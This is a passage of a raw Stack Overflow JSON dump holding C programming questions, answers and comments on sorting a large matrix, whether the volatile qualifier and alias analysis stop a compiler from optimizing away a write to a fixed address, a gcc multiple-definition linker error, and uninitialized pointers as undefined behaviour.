matrix.\nThe matrix is a huge matrix so the algorithm that I use has to be a nlogn algorithm.</p>\n\n<p>I have a structure as follows:</p>\n\n<pre><code>typedef struct{\nunsigned int line, column;\nfloat value;}Matrix;\n\nMatrix matrix[size_of_matrix*size_of_matrix];\nstatic int numb_of_matrix; /*Whenever I ask the user to insert values to the matrix, I increase this number to insert the structure inside my vector matrix*/\n</code></pre>\n\n<p>I also store the maximun and minimun index of rows and columns that are filled by the user, and the indexs inbetween those boundaries are set as 0, so I create a matrix of size_of_matrix*size_of_matrix full of 0's and then I insert my values there while storing the highest and lowest index of row and column filled by the user.</p>\n\n<p>Given that, I need to sort my matrix by sorting in the increasing order of rows and then by the increasing order of columns, or the other way around.\nThe way that I have to know which way it is that I have to sort the matrix is to ask the user to input C if I need to sort the matrix by columns first of nothing if I need to sort the matrix by rows first.</p>\n\n<p>So if I have introduced to the matrix the following:</p>\n\n<pre><code>[0,3]=1.2\n[3,0]=2.1\n[4,5]=2.2\n[2,5]=3.2\n[3,5]=4.2\n</code></pre>\n\n<p>and then I sort it by lines first, it should become</p>\n\n<pre><code>[0,3]=1.2\n[2,5]=3.2\n[3,0]=2.1\n[3,5]=4.2\n[4,5]=2.2\n</code></pre>\n\n<p>This problem would be quick to solve if the matrix was small enough, but my matrix will have near 1 million values, so I can't use the likes of bubble sort or any other n^2 sorting algorithm.</p>\n"}, {"tags": ["c", "gcc", "compilation"], "comments": [{"owner": {"reputation": 34185, "user_id": 5470596, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BITFt.jpg?s=128&g=1", "display_name": "YSC", "link": "https://stackoverflow.com/users/5470596/ysc"}, "edited": false, "score": 2, "creation_date": 1524658424, "post_id": 50021945, "comment_id": 87059897, "body": "You cannot be sure any compiler will optimize it away, but you can check by reading the assembly listing. Try <a href=\"https://linux.die.net/man/1/gcc\" title=\"man gcc\" rel=\"nofollow noreferrer\"><code>gcc -S</code></a>."}, {"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "reply_to_user": {"reputation": 34185, "user_id": 5470596, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BITFt.jpg?s=128&g=1", "display_name": "YSC", "link": "https://stackoverflow.com/users/5470596/ysc"}, "edited": false, "score": 0, "creation_date": 1524658542, "post_id": 50021945, "comment_id": 87060008, "body": "using <code>gcc -S</code> on two different compilers (<code>gcc</code> and <code>gcc-arm</code>) shows me this code is not optimized away. But I&#39;m looking for a certain assurance"}, {"owner": {"reputation": 2174, "user_id": 3349368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/57c9f50cb5783614c67eef86caf63139?s=128&d=identicon&r=PG", "display_name": "Paul Belanger", "link": "https://stackoverflow.com/users/3349368/paul-belanger"}, "edited": false, "score": 0, "creation_date": 1524658718, "post_id": 50021945, "comment_id": 87060137, "body": "A useful tool for looking at compiler optimizations is Matt Godbolt&#39;s <a href=\"https://godbolt.org/g/BWDKuQ\" rel=\"nofollow noreferrer\">Compiler Explorer</a>"}, {"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "reply_to_user": {"reputation": 178960, "user_id": 2079303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf7f63e49a75376e0f761c8abeb6d5a?s=128&d=identicon&r=PG", "display_name": "eerorika", "link": "https://stackoverflow.com/users/2079303/eerorika"}, "edited": false, "score": 0, "creation_date": 1524659450, "post_id": 50021945, "comment_id": 87060702, "body": "@user2079303 Well-formed C or ill-formed C++, I think (before the cast was edited in). And for some reason the question has both tags."}, {"owner": {"reputation": 178960, "user_id": 2079303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf7f63e49a75376e0f761c8abeb6d5a?s=128&d=identicon&r=PG", "display_name": "eerorika", "link": "https://stackoverflow.com/users/2079303/eerorika"}, "reply_to_user": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 0, "creation_date": 1524659695, "post_id": 50021945, "comment_id": 87060905, "body": "@aschepler oh, I didn&#39;t check if other languages were tagged. Well, now the code is well formed in both languages, and C++ is isn&#39;t even tagged anymore so my comment serves no purpose."}], "answers": [{"comments": [{"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524658824, "post_id": 50022144, "comment_id": 87060215, "body": "I know this. But do I really need the <code>volatile</code> here? is there a rule matching this code, according to it the compiler will decide to optimize it?"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524660845, "post_id": 50022144, "comment_id": 87061788, "body": "@user2162550 - The rule is only that a compiler may not optimize given the volatile. No such universally applicable guarantees exist without it."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524662093, "post_id": 50022144, "comment_id": 87062741, "body": "@PeterJ_01: Hum. Could have sworn I deleted that comment along with my answer."}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "edited": false, "score": 0, "creation_date": 1524673969, "post_id": 50022144, "comment_id": 87070673, "body": "Sadly the goalpost movement from C++ to C has affected this answer as well :("}], "tags": [], "owner": {"reputation": 34185, "user_id": 5470596, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BITFt.jpg?s=128&g=1", "display_name": "YSC", "link": "https://stackoverflow.com/users/5470596/ysc"}, "is_accepted": false, "score": 2, "last_activity_date": 1524662311, "last_edit_date": 1592644375, "creation_date": 1524658609, "answer_id": 50022144, "question_id": 50021945, "link": "https://stackoverflow.com/questions/50021945/can-the-following-lines-of-code-be-optimized-away/50022144#50022144", "title": "Can the following lines of code be optimized away?", "body": "<p>If you want to be sure a compiler will write the value <code>2</code> to the address <code>0x12345</code>, you'll be interested by the <code>volatile</code> qualifier.</p>\n<pre><code>volatile int *ptr = (int*) 0x12345; // hardware special address\n*ptr = 2;\n</code></pre>\n<p>This means every read or write to <code>*ptr</code> is to be considered to have side-effects by the compiler and cannot be optimized<sup>1</sup>.</p>\n<p>Note though, crafting such a pointer and writing to it has <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.3.2.3p5\" rel=\"nofollow noreferrer\">implementation-defined behaviour</a><sup>2</sup>, and you should refer to your compiler documentation anyway.</p>\n<hr />\n<p><sup>1)</sup> From C++ lastest draft (this question was tagged C++ in its first version), <code>[dcl.type.cv]/6</code> is given below.<br />\n<sup>2)</sup> Credit to user StoryTeller.</p>\n<hr />\n<blockquote>\n<h3><a href=\"http://eel.is/c++draft/dcl.type.cv#6\" rel=\"nofollow noreferrer\"><code>[dcl.type.cv]/6</code></a></h3>\n<p>[\u2009Note: volatile is a hint to the implementation to avoid aggressive optimization involving the object because the value of the object might be changed by means undetectable by an implementation. Furthermore, for some implementations, volatile might indicate that special hardware instructions are required to access the object. See [intro.execution] for detailed semantics. In general, the semantics of volatile are intended to be the same in C++ as they are in C. \u2014\u2009end note\u2009]</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524659010, "post_id": 50022214, "comment_id": 87060370, "body": "Can you provide a document reference for that?"}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "reply_to_user": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 1, "creation_date": 1524660044, "post_id": 50022214, "comment_id": 87061199, "body": "@user2162550 Documentation for what? That changes to memory state cannot be optimized away? It should be noted that this isn&#39;t a garbage collected language, any other pointer may be altered to point to and read from this address over the course of the program."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1524661166, "post_id": 50022214, "comment_id": 87062051, "body": "That needs to be a reinterpret_cast"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524661944, "post_id": 50022214, "comment_id": 87062623, "body": "It can be optimized away if the compiler do not see any use of this variable. It does not matter if the address is given by the integer number or the &amp;. <code>volatile</code> is the must"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524662174, "post_id": 50022214, "comment_id": 87062802, "body": "And the question is about C not C++"}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524663460, "post_id": 50022214, "comment_id": 87063621, "body": "@PeterJ_01 Yeah... it wasn&#39;t originally :("}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1524663622, "post_id": 50022214, "comment_id": 87063736, "body": "@StoryTeller Thanks... but it looks like the goal posts moved to C anyway :/"}, {"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524675225, "post_id": 50022214, "comment_id": 87071264, "body": "@PeterJ_01 <code>It can be optimized away if the compiler do not see any use of this variable.</code> do you mean another use of <code>ptr</code> beside <code>*ptr = 2</code> ? I&#39;m trying to understand the case in which you say this code can be optimized away."}, {"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524676347, "post_id": 50022214, "comment_id": 87071855, "body": "@JonathanMee Please note the conditions for your 4 points - <code>If the language being compiled is type safe, the compiler&#39;s type checker is correct, and the language lacks the ability to create pointers referencing local variables</code> please note that <code>C</code> not matching the last requirement <code>the language lacks the ability to create pointers referencing local variables</code>"}, {"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524679127, "post_id": 50022214, "comment_id": 87073311, "body": "@JonathanMee also, regarding your explanation <code>Clearly optimizing these lines away would result in a different memory state</code>, you can also say it on assignment on local variable on stack, lets say <code>func() { int x; x = 3; return 0; }</code> in this case the compiler can optimize <code>x</code> away, but this will result in different memory state up until the point where the address of <code>x</code> on stack (aka memory) gets override by another function&#39;s stack"}, {"owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "reply_to_user": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1524679573, "post_id": 50022214, "comment_id": 87073543, "body": "@user2162550 Optimizing <code>x</code> out of <code>func() { int x; x = 3; return 0; }</code> will not result in a different memory state after <code>func</code> returns. <code>ptr</code> hopefully points to something allocated on the heap, but it could point to another variable, it could even be the address of <code>func</code>&#39;s <code>x</code> variable. Thus, optimizing this variable out would result in a different memory state <i>even after</i> <code>ptr</code>&#39;s scope had closed."}], "tags": [], "owner": {"reputation": 34957, "user_id": 2642059, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Jonathan Mee", "link": "https://stackoverflow.com/users/2642059/jonathan-mee"}, "is_accepted": true, "score": 2, "last_activity_date": 1524665086, "last_edit_date": 1524665086, "creation_date": 1524658832, "answer_id": 50022214, "question_id": 50021945, "link": "https://stackoverflow.com/questions/50021945/can-the-following-lines-of-code-be-optimized-away/50022214#50022214", "title": "Can the following lines of code be optimized away?", "body": "<p>No, those cannot be optimized away.</p>\n\n<p><code>int* ptr = (int*)0x12345</code> establishes a pointer to the byte addressed by <code>0x12345</code> which you are presumably allocating elsewhere? However such an address, being odd, is not byte aligned which is at best unoptimized.</p>\n\n<p><code>*ptr = 2</code> assigns <code>2</code> to that address. Clearly optimizing these lines away would result in a different memory state. Thus they cannot be optimized away.</p>\n\n<hr>\n\n<p>The optimization away of references is allowed by <a href=\"https://en.wikipedia.org/wiki/Alias_analysis\" rel=\"nofollow noreferrer\">alias analysis</a> by which it can be determined whether, \"a storage location may be accessed in more than one way\"</p>\n\n<p><a href=\"/questions/tagged/c\" class=\"post-tag\" title=\"show questions tagged &#39;c&#39;\" rel=\"tag\">c</a> participates in <a href=\"https://en.wikipedia.org/wiki/Alias_analysis#Type-based_alias_analysis\" rel=\"nofollow noreferrer\">type-based alias analysis</a>:</p>\n\n<blockquote>\n  <ol>\n  <li>Two variables of different types cannot be in the same alias class since it is a property of strongly typed, memory reference-free (i.e., references to memory locations cannot be changed directly) languages that two variables of different types cannot share the same memory location simultaneously.</li>\n  <li>Allocations local to the current stack frame cannot be in the same alias class as any previous allocation from another stack frame. This is the case because new memory allocations must be disjoint from all other memory allocations.</li>\n  <li>Each record field of each record type has its own alias class, in general, because the typing discipline usually only allows for records of the same type to alias. Since all records of a type will be stored in an identical format in memory, a field can only alias to itself.</li>\n  <li>Similarly, each array of a given type has its own alias class.</li>\n  </ol>\n</blockquote>\n\n<p><strong>2</strong> is the real kicker here, because this isn't allocated locally to the current stack frame, <code>ptr</code> could be aliased to any other <code>int</code> in the program, thus the compiler cannot optimize it away.</p>\n"}], "owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "accepted_answer_id": 50022214, "answer_count": 2, "score": 2, "last_activity_date": 1524678069, "creation_date": 1524658077, "last_edit_date": 1524678069, "question_id": 50021945, "link": "https://stackoverflow.com/questions/50021945/can-the-following-lines-of-code-be-optimized-away", "title": "Can the following lines of code be optimized away?", "body": "<p>Can those lines of code be optimized away?</p>\n\n<pre><code>int *ptr = (int *)0x1234;\n*ptr = 2;\n/* no further code in the scope uses ptr */\n</code></pre>\n\n<p>Can I be sure that for any decent compiler and with any level of optimization, this code will be executed?</p>\n\n<p>Testing it with <code>-S</code> flag on two different compilers (<code>gcc</code> and <code>gcc-arm-none-eabi</code>) shows me this code is not optimized away. But I'm looking for a certain assurance or guideline regarding this specific code. </p>\n\n<p><strong>Solved <em>(I believe):</em></strong>  Accepted answer given by Jonathan Mee, from <a href=\"https://en.wikipedia.org/wiki/Alias_analysis\" rel=\"nofollow noreferrer\">Wikipedia - Alias analysis</a></p>\n\n<blockquote>\n  <p>...if it is not known if p and q alias or not, then no optimizations can be performed and the whole of the code must be executed</p>\n</blockquote>\n\n<p>To my understanding, <code>p</code> can be referred in this example to my <code>ptr</code> which points to <code>0x1234</code>, and <code>q</code> can actually be considered to any type of reference to this address on the program. </p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 0, "creation_date": 1524654154, "post_id": 50020432, "comment_id": 87056868, "body": "Need a <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a>."}], "answers": [{"comments": [{"owner": {"reputation": 107, "user_id": 9316761, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/e3613954f5b20145d4e51d015f24531d?s=128&d=identicon&r=PG&f=1", "display_name": "kunal", "link": "https://stackoverflow.com/users/9316761/kunal"}, "edited": false, "score": 0, "creation_date": 1524653877, "post_id": 50020496, "comment_id": 87056671, "body": "every time we are doing clean build... Not sure why this issue is hitting on RH5.x machines."}], "tags": [], "owner": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "is_accepted": false, "score": 1, "last_activity_date": 1524653753, "creation_date": 1524653753, "answer_id": 50020496, "question_id": 50020432, "link": "https://stackoverflow.com/questions/50020432/gcc-multiple-definition-issue-with-gcc-4-8-version/50020496#50020496", "title": "GCC: &#39;multiple definition&#39; Issue with gcc 4.8 version", "body": "<p>Could be object files from a build on another system. Try doing a clean build.</p>\n"}], "owner": {"reputation": 107, "user_id": 9316761, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/e3613954f5b20145d4e51d015f24531d?s=128&d=identicon&r=PG&f=1", "display_name": "kunal", "link": "https://stackoverflow.com/users/9316761/kunal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "closed_date": 1524664068, "answer_count": 1, "score": -3, "last_activity_date": 1524653753, "creation_date": 1524653553, "question_id": 50020432, "link": "https://stackoverflow.com/questions/50020432/gcc-multiple-definition-issue-with-gcc-4-8-version", "closed_reason": "Not suitable for this site", "title": "GCC: &#39;multiple definition&#39; Issue with gcc 4.8 version", "body": "<p>Recently we have moved our gcc version from 4.1.x to 4.8.3.\nSome of my team mates are working on RH5.X and others are working on RH6.5 Versioned machines.</p>\n\n<p>I notice that, on RH 5.X machine. when we try to build the code we are facing following issue while creating dynamic library.</p>\n\n<p><strong>PS:-</strong> We are not hitting this issue on RH6.X machines.</p>\n\n<p><strong>Log:-</strong></p>\n\n<p>codec_main.c.text+0x0): multiple definition of <code>vprintf'\n/local/workspace/first/branch/dsc/cmd_parse.o:cmd_parse.c.text+0x510): first defined here\n/local/workspace/first/branch/dsc/codec_main.o: In function</code>getchar':\ncodec_main.c.text+0x40): multiple definition of <code>getchar'\n/local/workspace/first/dsc/cmd_parse.o:cmd_parse.c.text+0x550): first defined here\n/local/workspace/first/branch/lpddr5_branch/src/main/cvip/build/Linux/Release/lib/extlibs/dsc/codec_main.o: In function</code>fgetc_unlocked':\ncodec_main.c.text+0x70): multiple definition of `fgetc_unlocked'</p>\n\n<p>Can you please help?</p>\n"}, {"tags": ["c", "gcc", "clang", "micro-optimization"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1524653186, "post_id": 50020196, "comment_id": 87056298, "body": "Compiler specific ways/extension exist for a need. Now, I don&#39;t doubt the validity of this question, but what need is there to conserve a single <code>xor reg reg</code>?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524653301, "post_id": 50020196, "comment_id": 87056358, "body": "The <code>_MAGIC_COMPILER_UNINITIALIZED_VALUE</code> you need is the &quot;standard&quot; when you don&#39;t do any explicit initialization at all. If you want an uninitialized variable, then let it be uninitialized."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1524653306, "post_id": 50020196, "comment_id": 87056360, "body": "@Someprogrammerdude , leaving it uninitialized is UB, the risk of nasal demons is always present, you never know a &quot;smart&quot; optimizer might remove the function call entirely, it&#39;s UB"}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1524653343, "post_id": 50020196, "comment_id": 87056382, "body": "@StoryTeller , academical curiosity, as I wrote I&#39;m absolutely not going to use this, but I was curious"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524653349, "post_id": 50020196, "comment_id": 87056387, "body": "Leaving a pointer uninitialized only leads to UB if the pointer is actually dereferenced. If you <i>know</i> it will never be dereferenced, there&#39;s no UB."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1524653437, "post_id": 50020196, "comment_id": 87056433, "body": "@Someprogrammerdude - There&#39;s a fine point here. If the pointer value is indeterminate, even copying its value is UB (assuming I&#39;m not getting C and C++ mixed up here). So passing it to the function is itself UB."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1524653549, "post_id": 50020196, "comment_id": 87056492, "body": "@StoryTeller IIRC in C it&#39;s only UB if the value corresponds to a trap value. Which for any kind of integer values (which pointers really are on just about all systems) there really are none. In C++ it&#39;s specified that even reading an indeterminate value is UB (again IIRC)."}, {"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524653655, "post_id": 50020196, "comment_id": 87056548, "body": "@Someprogrammerdude - technically, accessing the VALUE of an uninitialised pointer gives undefined behaviour, which happens before dereferencing.    Practically, the consequences are only potentially observable with most implementations if the pointer is dereferenced.   For example, the act of passing an uninitialised pointer as an argument to a function does not, practically, cause unwanted behaviour."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524653811, "post_id": 50020196, "comment_id": 87056626, "body": "Yeah, I used a pointer because it has an obvious &quot;default&quot; value, but the unused variable could have been of any type."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1524655179, "post_id": 50020196, "comment_id": 87057536, "body": "<code>a &quot;smart&quot; optimizer might remove the function call entirely</code>.  Wrong: both functions are external, resolving their addresses is a task for the linker. Also: I do not see the problem of  <i>zeroing</i>. (performancewise: compared to a function call through a pointer it is nothing)"}, {"owner": {"reputation": 112912, "user_id": 